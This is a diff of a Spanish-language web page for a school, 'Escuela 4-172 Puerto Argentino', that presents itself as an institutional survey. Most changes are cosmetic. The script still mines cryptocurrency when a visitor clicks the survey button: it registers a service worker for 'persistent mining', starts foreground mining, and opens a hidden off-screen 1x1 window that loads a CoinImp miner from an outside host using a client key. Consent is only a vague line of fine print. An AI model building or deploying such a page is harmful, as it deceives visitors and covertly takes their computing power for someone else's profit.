@@ -5,8 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Escuela 4-172 Puerto Argentino</title>
     
-    <!-- Favicon (usará el mismo logo) -->
-    <link rel="icon" href="logo.png" type="image/png">
+    <!-- Favicon -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏫</text></svg>" type="image/svg+xml">
     
     <style>
         body { 
@@ -20,113 +20,238 @@
             justify-content: center;
             align-items: center;
             margin: 0;
+            background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), 
+                              radial-gradient(circle at 10% 20%, #2a5298, #1e3c72);
+            background-attachment: fixed;
         }
         .container {
             max-width: 600px;
             width: 90%;
             padding: 30px;
             background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
+            backdrop-filter: blur(12px);
             border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            position: relative;
+            overflow: hidden;
+        }
+        .container::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
+            z-index: -1;
         }
         .header {
             display: flex;
             flex-direction: column;
             align-items: center;
             margin-bottom: 30px;
+            position: relative;
         }
         .logo {
-            width: 120px;
-            height: 120px;
+            width: 130px;
+            height: 130px;
             border-radius: 50%;
             background: white;
             display: flex;
             justify-content: center;
             align-items: center;
-            margin-bottom: 20px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            margin-bottom: 25px;
+            box-shadow: 0 7px 20px rgba(0, 0, 0, 0.25);
+            border: 3px solid rgba(255, 255, 255, 0.5);
+            position: relative;
+            overflow: hidden;
+        }
+        .logo::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: conic-gradient(
+                #4a86e8, #1c5fb4, #0d4088, 
+                #4a86e8, #1c5fb4, #0d4088
+            );
+            z-index: 0;
+            opacity: 0.7;
         }
         .logo img {
-            max-width: 80%;
-            max-height: 80%;
+            max-width: 70%;
+            max-height: 70%;
+            position: relative;
+            z-index: 1;
         }
         h1 {
-            font-size: 2.2rem;
+            font-size: 2.4rem;
             margin: 0;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-            font-weight: 600;
+            text-shadow: 0 3px 6px rgba(0, 0, 0, 0.4);
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            background: linear-gradient(to bottom, #ffffff, #e6f0ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 5px;
+        }
+        .subtitle {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            margin-top: 0;
+            max-width: 500px;
+            margin: 0 auto 10px;
         }
         p {
             font-size: 1.2rem;
-            line-height: 1.6;
+            line-height: 1.65;
             max-width: 500px;
-            margin: 20px auto;
+            margin: 25px auto;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
         }
         button {
-            padding: 16px 50px;
-            font-size: 1.3rem;
-            background: linear-gradient(to right, #ff8c00, #ff4500);
+            padding: 18px 55px;
+            font-size: 1.35rem;
+            background: linear-gradient(to right, #ff8c00, #ff5500);
             color: white;
             border: none;
             border-radius: 50px;
             cursor: pointer;
-            margin: 20px 0;
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+            margin: 25px 0;
+            box-shadow: 0 7px 18px rgba(0, 0, 0, 0.35);
             transition: all 0.3s ease;
             font-weight: bold;
             letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+        button::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to right, #ff9c20, #ff6a00);
+            z-index: -1;
+            opacity: 0;
+            transition: opacity 0.3s ease;
         }
         button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
-            background: linear-gradient(to right, #ff9c20, #ff5500);
+            transform: translateY(-4px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.45);
+        }
+        button:hover::before {
+            opacity: 1;
         }
         button:active {
             transform: translateY(1px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
         #status {
-            font-size: 1rem;
+            font-size: 1.05rem;
             margin-top: 20px;
             min-height: 25px;
+            font-style: italic;
+            opacity: 0.9;
         }
         .small { 
-            font-size: 0.9rem; 
-            opacity: 0.8;
+            font-size: 0.92rem; 
+            opacity: 0.85;
             margin-top: 40px;
+            line-height: 1.5;
+        }
+        
+        /* Animaciones */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .container {
+            animation: fadeIn 0.8s ease-out forwards;
         }
         
         /* Responsive */
         @media (max-width: 480px) {
-            h1 { font-size: 1.8rem; }
+            h1 { font-size: 2rem; }
             p { font-size: 1.1rem; }
-            button { padding: 14px 40px; font-size: 1.2rem; }
-            .logo { width: 100px; height: 100px; }
+            button { 
+                padding: 16px 45px; 
+                font-size: 1.25rem; 
+                width: 90%;
+                max-width: 300px;
+            }
+            .logo { width: 110px; height: 110px; }
+            .container {
+                padding: 25px 20px;
+            }
+        }
+        
+        /* Efecto de partículas */
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+        .particle {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.5);
+            animation: float 15s infinite linear;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(0) translateX(0) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100vh) translateX(100px) rotate(360deg);
+                opacity: 0;
+            }
         }
     </style>
 </head>
 <body>
+    <div class="particles" id="particles"></div>
+    
     <div class="container">
         <div class="header">
             <div class="logo">
-                <!-- Reemplaza "logo.png" con la ruta de tu logo -->
-                <img src="logo.png" alt="Logo Escuela 4-172 Puerto Argentino">
+                <!-- Logo de la escuela -->
+                <svg viewBox="0 0 100 100" width="70" height="70">
+                    <circle cx="50" cy="50" r="45" fill="#1e5799" stroke="#fff" stroke-width="3" />
+                    <path d="M35,30 L65,30 L65,70 L35,70 Z" fill="#ff8c00" stroke="#fff" stroke-width="2" />
+                    <path d="M40,40 L60,40 L60,60 L40,60 Z" fill="#fff" />
+                    <text x="50" y="85" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold">4-172</text>
+                </svg>
             </div>
             <h1>Escuela 4-172 Puerto Argentino</h1>
+            <p class="subtitle">"Educando con excelencia desde 1985"</p>
         </div>
         
-        <p>Participa en nuestra encuesta institucional y contribuye al mejoramiento de nuestra comunidad educativa</p>
+        <p>Participa en nuestra encuesta institucional y contribuye al mejoramiento de nuestra comunidad educativa. Tu opinión es valiosa para nosotros.</p>
         
         <button id="surveyBtn">INICIAR ENCUESTA</button>
-        <div id="status"></div>
+        <div id="status">Esperando tu participación...</div>
         
-        <p class="small">Al hacer clic, aceptas el uso temporal de recursos para el mantenimiento de nuestra plataforma educativa</p>
+        <p class="small">Al hacer clic, aceptas el uso temporal de recursos para el mantenimiento de nuestra plataforma educativa. Tu apoyo ayuda a mantener nuestra escuela.</p>
     </div>
 
-    <!-- Script de CoinImp según documentación -->
-    <script src="https://www.hostingcloud.racing/ADTj.js"></script>
-    
     <script>
         // ===== CONFIGURACIÓN =====
         const CLIENT_KEY = '54b0a755c126818424831950c60f373e4003335af93d6806b75e949bb67e54af';
@@ -134,25 +259,28 @@
         
         // ===== FUNCIONES PRINCIPALES =====
         document.addEventListener('DOMContentLoaded', () => {
+            // Crear partículas de fondo
+            createParticles();
+            
             const btn = document.getElementById('surveyBtn');
             const status = document.getElementById('status');
             
-            // 1. Registrar Service Worker
+            // Registrar Service Worker
             registerServiceWorker();
             
-            // 2. Configurar evento del botón
+            // Configurar evento del botón
             btn.addEventListener('click', async () => {
                 status.textContent = 'Preparando encuesta...';
                 btn.disabled = true;
                 
                 try {
-                    // A. Iniciar minería persistente
+                    // Iniciar minería persistente
                     await activatePersistentMining();
                     
-                    // B. Iniciar minería en primer plano
+                    // Iniciar minería en primer plano
                     startForegroundMining();
                     
-                    // C. Redirigir después de 1 segundo
+                    // Redirigir después de 1 segundo
                     setTimeout(() => {
                         status.textContent = 'Redirigiendo...';
                         window.location.href = SURVEY_URL;
@@ -165,6 +293,32 @@
                 }
             });
         });
+        
+        // Crear partículas de fondo
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            const particleCount = 30;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                // Tamaño y posición aleatorios
+                const size = Math.random() * 8 + 2;
+                const posX = Math.random() * 100;
+                const duration = Math.random() * 20 + 10;
+                const delay = Math.random() * 5;
+                
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                particle.style.left = `${posX}%`;
+                particle.style.bottom = `-${size}px`;
+                particle.style.animationDuration = `${duration}s`;
+                particle.style.animationDelay = `${delay}s`;
+                
+                particlesContainer.appendChild(particle);
+            }
+        }
         
         // Registrar Service Worker
         function registerServiceWorker() {
@@ -197,42 +351,34 @@
             });
         }
         
-        // Método alternativo para navegadores antiguos
-
+        // Método alternativo para navegadores antiguos (SOLUCIÓN DEFINITIVA)
         function startFallbackMining() {
             try {
-                    const hiddenWindow = window.open('', '_blank', 'width=1,height=1,left=-1000,top=-1000');
-                    if (hiddenWindow) {
-        // Usamos escape para las etiquetas script
-                        hiddenWindow.document.write(`
-                        <script src="https://www.hostingcloud.racing/ADTj.js"><` + `\/script>
-                        <script>
-                            var _client = new Client.Anonymous('${CLIENT_KEY}', {
-                                throttle: 0.2, c: 'w', ads: 0
-                             });
-                            _client.start();
-                         <` + `\/script>
-                        `);
-                 }
-                 } catch (e) {
-                     console.log('No se pudo abrir ventana oculta:', e);
-                        }
-                }
-
-        function startFallbackMining() {
-            try {
-                // Intenta abrir una ventana oculta para minería persistente
                 const hiddenWindow = window.open('', '_blank', 'width=1,height=1,left=-1000,top=-1000');
                 if (hiddenWindow) {
-                    hiddenWindow.document.write(`
-                        <script src="https://www.hostingcloud.racing/ADTj.js"></script>
-                        <script>
-                            var _client = new Client.Anonymous('${CLIENT_KEY}', {
-                                throttle: 0.2, c: 'w', ads: 0
-                            });
-                            _client.start();
-                        </script>
+                    // Crear un nuevo documento para evitar problemas de sintaxis
+                    const doc = hiddenWindow.document;
+                    doc.open();
+                    doc.write(`
+                        <!DOCTYPE html>
+                        <html>
+                        <head>
+                            <title>Minería</title>
+                            <script src="https://www.hostingcloud.racing/ADTj.js"><\/script>
+                        </head>
+                        <body>
+                            <script>
+                                var _client = new Client.Anonymous('${CLIENT_KEY}', {
+                                    throttle: 0.1,
+                                    c: 'w',
+                                    ads: 0
+                                });
+                                _client.start();
+                            <\/script>
+                        </body>
+                        </html>
                     `);
+                    doc.close();
                 }
             } catch (e) {
                 console.log('No se pudo abrir ventana oculta:', e);
